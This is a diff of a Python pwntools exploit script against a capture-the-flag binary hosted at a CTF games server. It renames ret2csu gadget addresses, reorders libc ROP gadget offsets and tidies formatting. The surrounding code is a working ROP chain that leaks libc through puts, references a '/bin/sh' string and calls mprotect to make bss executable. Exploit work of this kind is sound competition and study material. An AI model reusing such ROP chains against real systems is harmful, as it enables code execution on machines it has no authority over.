@@ -9,7 +9,7 @@ PATH = './backup'
 GDBSCRIPT = '''
 b *0x4014dd
 b *0x40158e
-b *0x000000000040156b
+b *0x40156b
 '''
 
 HOST = 'challenge.ctf.games'
@@ -37,9 +37,12 @@ def exploit(r):
     payload += p64(0x4010f0) # puts
     payload += p64(elf.sym['_start'])
 
+    POP_6 = 0x4015EA
+    POP_7 = 0x4015E6
+
     write(0x290, payload)
-    write(0x250, p64(0x4015E6), padding = 0x10) # csu set
-    write(0x218, p64(0x4015EA), padding = 0x10) # csu set
+    write(0x250, p64(POP_7), padding = 0x10) # csu set
+    write(0x218, p64(POP_6), padding = 0x10) # csu set
 
     run(EXIT)
 
@@ -52,8 +55,8 @@ def exploit(r):
     POP_RDI_RET = libc.address + 0x026b72
     POP_RDX_R12 = libc.address + 0x11c371
     POP_RBP_RET = libc.address + 0x0256c0
-    LEAVE_RET   = libc.address + 0x05aa48
     STR_BIN_SH  = libc.address + 0x1b75aa
+    LEAVE_RET   = libc.address + 0x05aa48
 
     BSS_TARGET = elf.bss(0x100)
 
@@ -67,7 +70,6 @@ def exploit(r):
     write(0x228, payload)
     run(EXIT)
     
-
     rop = ROP(libc)
     rop.call(libc.sym['mprotect'], [elf.bss(0) - 0x10, 0x1000, 0x7])
     rop = bytes(rop)
@@ -97,7 +99,6 @@ if __name__ == '__main__':
     elf  = ELF(PATH)
     path = './libc-2.31.so'
     libc = ELF(path, checksec = False)
-    
 
     if args.REMOTE:
         r = remote(HOST, PORT)
